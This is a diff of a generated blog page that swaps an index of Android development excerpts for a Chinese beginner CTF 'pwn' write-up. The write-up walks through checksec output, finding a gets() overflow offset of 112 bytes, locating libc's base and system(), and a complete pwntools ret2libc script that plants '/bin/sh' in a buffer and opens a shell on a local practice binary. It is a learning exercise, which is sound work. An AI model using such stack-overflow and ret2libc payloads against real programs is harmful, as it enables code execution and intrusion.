@@ -93,16 +93,17 @@
 
 
 
-<meta name="description" content="我会想念大家的">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Ekkkkkkko">
-<meta property="og:url" content="http://yoursite.com/page/4/index.html">
+<meta name="description" content="前一阵看了一点点pwn的基础教程https://www.anquanke.com/post/id/168468，里面正好留了一个作业，就顺手做了一下，还是比较简单的 首先checksec12RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Forti">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwn的一个入门题目">
+<meta property="og:url" content="http://yoursite.com/2019/01/30/pwn的一个入门题目/index.html">
 <meta property="og:site_name" content="Ekkkkkkko">
-<meta property="og:description" content="我会想念大家的">
+<meta property="og:description" content="前一阵看了一点点pwn的基础教程https://www.anquanke.com/post/id/168468，里面正好留了一个作业，就顺手做了一下，还是比较简单的 首先checksec12RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Forti">
 <meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2019-02-18T14:28:57.576Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Ekkkkkkko">
-<meta name="twitter:description" content="我会想念大家的">
+<meta name="twitter:title" content="pwn的一个入门题目">
+<meta name="twitter:description" content="前一阵看了一点点pwn的基础教程https://www.anquanke.com/post/id/168468，里面正好留了一个作业，就顺手做了一下，还是比较简单的 首先checksec12RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Forti">
 
 
 
@@ -130,13 +131,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/page/4/"/>
+  <link rel="canonical" href="http://yoursite.com/2019/01/30/pwn的一个入门题目/"/>
 
 
 
 
 
-  <title>Ekkkkkkko</title>
+  <title>pwn的一个入门题目 | Ekkkkkkko</title>
   
 
 
@@ -161,9 +162,7 @@
     
   
 
-  <div class="container sidebar-position-left 
-   page-home 
- ">
+  <div class="container sidebar-position-left page-post-detail ">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -246,9 +245,9 @@
         <div class="content-wrap">
           <div id="content" class="content">
             
-  <section id="posts" class="posts-expand">
+
+  <div id="posts" class="posts-expand">
     
-      
 
   
 
@@ -257,7 +256,7 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/07/08/解决Android6-0通知栏下栏缓慢的问题/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/30/pwn的一个入门题目/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="一只大茶蛋">
@@ -274,9 +273,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2017/07/08/解决Android6-0通知栏下栏缓慢的问题/" itemprop="url">解决Android6.0通知栏下栏缓慢的问题</a></h1>
+          <h1 class="post-title" itemprop="name headline">pwn的一个入门题目</h1>
         
 
         <div class="post-meta">
@@ -288,8 +285,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-07-08T09:45:07+08:00">
-                2017-07-08
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-01-30T00:50:54+08:00">
+                2019-01-30
               </time>
             
 
@@ -323,33 +320,42 @@
       
 
       
+        <p>前一阵看了一点点pwn的基础教程<a href="https://www.anquanke.com/post/id/168468，里面正好留了一个作业，就顺手做了一下，还是比较简单的" target="_blank" rel="noopener">https://www.anquanke.com/post/id/168468，里面正好留了一个作业，就顺手做了一下，还是比较简单的</a></p>
+<p>首先checksec<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable  FILE</div><div class="line">Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   83 Symbols     No	0		4	pwn7</div></pre></td></tr></table></figure></p>
+<p>ida看到漏洞函数为gets</p>
+<p>然后使用<br>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAACCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC</p>
+<p>这个超长的字符串,输入后查看报错信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────</div><div class="line">[!] Cannot disassemble from $PC</div><div class="line">[!] Cannot access memory at address 0x41414141</div><div class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</div></pre></td></tr></table></figure></p>
+<p>找到返回值地址为AAAA的那个地方,即变量距离返回值地址112字节</p>
+<p>ROPgadget –binary pwn7 –string “/bin/sh” 发现没有目标字符串<br>在ida中也没有看到相应的system函数导入</p>
+<p>这里大致的思路是在get中传入字符串 /bin/sh ,并且使用系统调用</p>
+<p>由于开启了NX,这里需要绕过</p>
+<p>使用gdb查看libc.so的base addr<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">➜  pwn LD_TRACE_LOADED_OBJECTS=1 ./pwn7</div><div class="line">	linux-gate.so.1 =&gt;  (0xf7ef9000)</div><div class="line">	libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xf7d1d000)</div><div class="line">	/lib/ld-linux.so.2 (0xf7efb000)</div></pre></td></tr></table></figure></p>
+<p>在function view中查找system函数,得system地址为 0x0003ADA0<br>但是我这个ubuntu应该是开了随机化,加载lib库的地址不固定了,这里是直接读的proc/pid/maps</p>
+<p>然后搜索/bin/sh字符串,发现还是没有,这里可以自己输入一个<br>最后构造的payload大概如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">A*112</div><div class="line">system</div><div class="line">0xdeaebuff</div><div class="line">/bin/sh</div></pre></td></tr></table></figure></p>
+<p>这里的/bin/sh不能直接放到payload中,需要预先放到某个位置,这里题目给预留了..0804A080 这里有个buf2</p>
+<p>所以payload最后是这样<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/python</div><div class="line"># -*- coding: UTF-8 -*-</div><div class="line">from pwn import *</div><div class="line"></div><div class="line">import os</div><div class="line"></div><div class="line">sh = process(&apos;./pwn7&apos;)</div><div class="line">shelf = ELF(&apos;./pwn7&apos;)</div><div class="line">s_pid = proc.pidof(sh)[0]</div><div class="line">print s_pid</div><div class="line">proc_path = &apos;/proc/&apos; + str(s_pid) + &apos;/maps&apos;</div><div class="line">maps_str = os.popen(&apos;cat &apos; + proc_path).read()</div><div class="line">libc_base_addr = 0</div><div class="line">for s in maps_str.split(&apos;\n&apos;):</div><div class="line">    if s.find(&apos;libc-2.23.so&apos;) != -1 :</div><div class="line">        libc_base_addr = s.split(&apos;-&apos;)[0]</div><div class="line">        break</div><div class="line">libc_base_addr = int(libc_base_addr,16)</div><div class="line">print libc_base_addr</div><div class="line">gets_plt = shelf.plt[&apos;gets&apos;]</div><div class="line">print maps_str</div><div class="line"></div><div class="line">system_offset = 0x0003ADA0</div><div class="line">system_plt = libc_base_addr + system_offset</div><div class="line"></div><div class="line">pop_ebp = 0x080486ff</div><div class="line">buf2 = 0x0804A080</div><div class="line">payload = flat(</div><div class="line">    [&apos;a&apos; * 112, gets_plt, pop_ebp, buf2, system_plt, 0xabcdabcd, buf2])</div><div class="line">sh.sendline(payload)</div><div class="line">sh.sendline(&apos;/bin/sh&apos;)</div><div class="line">sh.interactive()</div></pre></td></tr></table></figure></p>
+
+      
+    </div>
+
+    <div>
+      
         
-          
-          最近在开发中想要实现一个下拉通知栏的功能，但是在6.0上使用方法下拉，展开动画十分缓慢，刚好在Nova launcher中，也实现了下拉通知栏，而且在6.0上提示说获取root权限，变通的解决这个问题，在酷安开发者群有朋友提到说可以在获取root权限后使用shell模拟触摸事件来实现这个方法，测试以后发现确实可行。调用如下指令模拟手势实现下拉：adb shell input swipe 100 1 100 500 300   模拟滑动事件 在x 100 y 1的位置滑动到 x 100 y 500的位置 历时300毫秒
-此时通知栏并不会完全展开，解决方法也非常简单，再模拟一次下拉事件，点击刚刚没有完全展开的状态栏即可：
-adb shell input tap 100 100  模拟点击事件，点击了一下x 100 y 100的位置 模拟点击会出现奇奇怪怪的问题，可能在其他rom上会点击到其他的位置，所以再做一次下滑会好一些这样通知栏就完全展开了
 
-          
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2017/07/08/解决Android6-0通知栏下栏缓慢的问题/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
+      
+    </div>
+
+    <div>
+      
         
+
       
     </div>
 
     <div>
       
-    </div>
+        
 
-    <div>
-      
-    </div>
-
-    <div>
       
     </div>
 
@@ -357,266 +363,38 @@ adb shell input tap 100 100  模拟点击事件，点击了一下x 100 y 100的�
       
 
       
-
-      
-
       
       
-        <div class="post-eof"></div>
+
       
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/07/08/Android启动快捷方式的方法/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="一只大茶蛋">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="https://avatars1.githubusercontent.com/u/15843222?v=3&s=460">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Ekkkkkkko">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2017/07/08/Android启动快捷方式的方法/" itemprop="url">Android启动快捷方式的方法</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
             
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-07-08T09:37:58+08:00">
-                2017-07-08
-              </time>
+              <a href="/2018/10/12/在Android-p上添加framework-api/" rel="next" title="在Android p上添加framework api">
+                <i class="fa fa-chevron-left"></i> 在Android p上添加framework api
+              </a>
             
+          </div>
 
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
             
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
+          </div>
         </div>
-      </header>
-    
-
-    <div class="post-body" itemprop="articleBody">
-
-      
       
 
       
-        
-          
-          最近想在APP中启动其他应用的快捷方式（不是启动应用，而是启动类似绿色守护中那种，关屏并休眠的快捷方式）
-在网上找了很多文章，大部分都是讲如何设置快捷方式，并没有说如何用代码启动，就稍微折腾了一下。
-方法如下12345678910111213141516171819202122232425262728293031323334//获取到所有快捷方式 Intent shortcutsIntent = new Intent(Intent.ACTION_CREATE_SHORTCUT);        List&lt;ResolveInfo&gt; shortcuts = getPackageManager().queryIntentActivities(                shortcutsIntent, 0);        for (ResolveInfo resolveInfo : shortcuts) &#123;            String name = resolveInfo.activityInfo.applicationInfo.packageName; 
-          ...
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2017/07/08/Android启动快捷方式的方法/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
       
     </footer>
   </article>
 
 
-    
-      
 
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/07/07/Android中快捷启动支付宝微信扫一扫的方法/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="一只大茶蛋">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="https://avatars1.githubusercontent.com/u/15843222?v=3&s=460">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Ekkkkkkko">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2017/07/07/Android中快捷启动支付宝微信扫一扫的方法/" itemprop="url">Android中快捷启动支付宝微信扫一扫的方法</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-07-07T15:10:34+08:00">
-                2017-07-07
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-          Android 快捷打开支付宝微信扫码的方法支付宝&amp;微信扫一扫 ✓支付宝扫一扫：1234Uri uri = Uri.parse("alipayqr://platformapi/startapp?saId=10000007");Intent intent = new Intent(Intent.ACTION_VIEW, uri);intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK);context.startActivity(intent);
-微信原来的扫一扫打开是这样的，不过目前的版本已经失效了123Uri uri = Uri.parse("weixin://dl/scan");Intent intent = new Intent(Intent.ACTION_VIEW, uri);startActivity(intent);
-所以只能使用am命令来控制二维码界面的activity打开
-使用开发者工具调试后发现微信二维码的activity是这个com.tencent.mm.
-          ...
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2017/07/07/Android中快捷启动支付宝微信扫一扫的方法/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
+    <div class="post-spread">
       
     </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-  </section>
-
-  
-  <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/3/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span>
-  </nav>
-
+  </div>
 
 
           </div>
@@ -624,6 +402,10 @@ adb shell input tap 100 100  模拟点击事件，点击了一下x 100 y 100的�
 
 
           
+  <div class="comments" id="comments">
+    
+  </div>
+
 
         </div>
         
@@ -836,10 +618,10 @@ adb shell input tap 100 100  模拟点击事件，点击了一下x 100 y 100的�
   
 
   
-    <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.1"></script>
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.1"></script>
 <script type="text/javascript" src="/js/src/post-details.js?v=5.1.1"></script>
 
-  
+
 
   
 
